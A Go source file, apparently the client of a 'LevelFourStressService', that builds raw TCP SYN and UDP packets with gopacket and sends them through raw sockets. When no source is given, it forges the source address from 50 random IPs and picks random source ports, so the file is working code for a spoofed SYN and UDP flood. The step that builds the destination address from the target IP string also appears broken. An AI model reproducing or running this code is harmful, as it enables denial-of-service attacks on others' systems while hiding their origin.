//go:build linux

package service

import (
	"client/internal/models"
	cryptmath "crypto/rand"
	"fmt"
	"math/rand"
	"net"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

var (
	ports []int
	ips   []string
)

func init() {
	makeRandomPorts()
	makeRandomIPAddrs()
}

func (s *LevelFourStressService) MakeRequestAndSend(request *models.Target) (uint16, int, error) {
	var bts []byte
	var err error
	var client int

	if request.Type.Uint16()&models.TCP.Uint16() != 0 {
		if bts, err = buildTCP(
			net.ParseIP(request.SourceIP),
			net.ParseIP(request.TargetIP),
			request.SourcePort,
			request.TargetPort,
			request.PacketSequenceNumber); err != nil {
			return 0, 0, err
		}
		client = s.clientTCP
	} else if request.Type.Uint16()&models.UDP.Uint16() != 0 {
		if bts, err = buildUDP(
			net.ParseIP(request.SourceIP),
			net.ParseIP(request.TargetIP),
			request.SourcePort,
			request.TargetPort); err != nil {
			return 0, 0, err
		}
		client = s.clientUDP
	}

	addr := syscall.SockaddrInet4{Addr: [4]byte{request.TargetIP[0], request.TargetIP[1], request.TargetIP[2], request.TargetIP[3]}}
	if err = syscall.Sendto(client, bts, 0, &addr); err != nil {
		return 0, 0, err
	}
	return uint16(len(s.payload)), 0, nil
}

func ipLayer(srcIP, dstIP net.IP, proto layers.IPProtocol) *layers.IPv4 {
	return &layers.IPv4{
		SrcIP:    srcIP,
		DstIP:    dstIP,
		Version:  4,
		Protocol: proto,
		TTL:      64,
	}
}

func tcpLayer(srcPort, dstPort uint16, seq uint32) *layers.TCP {
	return &layers.TCP{
		SrcPort: layers.TCPPort(srcPort),
		DstPort: layers.TCPPort(dstPort),
		Window:  14600,
		Seq:     seq,
		SYN:     true,
	}
}

func udpLayer(srcPort, dstPort uint16) *layers.UDP {
	return &layers.UDP{
		SrcPort: layers.UDPPort(srcPort),
		DstPort: layers.UDPPort(dstPort),
	}
}

func buildTCP(sourceIP, destinationIP net.IP, sourcePort, destinationPort uint16, seqNumber uint32) ([]byte, error) {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	if sourcePort == 0 {
		sourcePort = uint16(ports[r.Intn(len(ports))])
	}
	if sourceIP == nil {
		sourceIP = net.ParseIP(ips[r.Intn(len(ips))])
	}
	if seqNumber == 0 {
		seqNumber = uint32(r.Intn(65535))
	}

	tl := tcpLayer(sourcePort, destinationPort, seqNumber)
	il := ipLayer(sourceIP, destinationIP, layers.IPProtocolTCP)
	if err := tl.SetNetworkLayerForChecksum(il); err != nil {
		return nil, err
	}

	tcpBuff := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(tcpBuff, options, il, tl, gopacket.Payload(make([]byte, 0))); err != nil {
		return nil, err
	}

	return tcpBuff.Bytes(), nil
}

func buildUDP(sourceIP, destinationIP net.IP, sourcePort, destinationPort uint16) ([]byte, error) {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	if sourcePort == 0 {
		sourcePort = uint16(ports[r.Intn(len(ports))])
	}
	if sourceIP == nil {
		sourceIP = net.ParseIP(ips[r.Intn(len(ips))])
	}

	udp := udpLayer(sourcePort, destinationPort)
	ipl := ipLayer(sourceIP, destinationIP, layers.IPProtocolUDP)

	if err := udp.SetNetworkLayerForChecksum(ipl); err != nil {
		return nil, err
	}

	tcpBuff := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	pl := make([]byte, 1024)
	if _, err := cryptmath.Read(pl); err != nil {
		return nil, err
	}

	if err := gopacket.SerializeLayers(tcpBuff, options, ipl, udp, gopacket.Payload(pl)); err != nil {
		return nil, err
	}

	return tcpBuff.Bytes(), nil
}

func makeRandomPorts() {
	for i := 1024; i <= 65535; i++ {
		ports = append(ports, i)
	}
}

func makeRandomIPAddrs() {
	var addr []string
	random := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < 50; i++ {
		one := random.Intn(256)
		two := random.Intn(256)
		three := random.Intn(256)
		four := random.Intn(256)
		addr = append(addr, fmt.Sprintf("%d.%d.%d.%d", one, two, three, four))
	}
	ips = addr
}

func TcpSocketClient() int {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		return 0
	}
	if err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
		return 0
	}
	return fd
}

func UdpSocketClient() int {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_UDP)
	if err != nil {
		return 0
	}
	if err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
		return 0
	}
	return fd
}
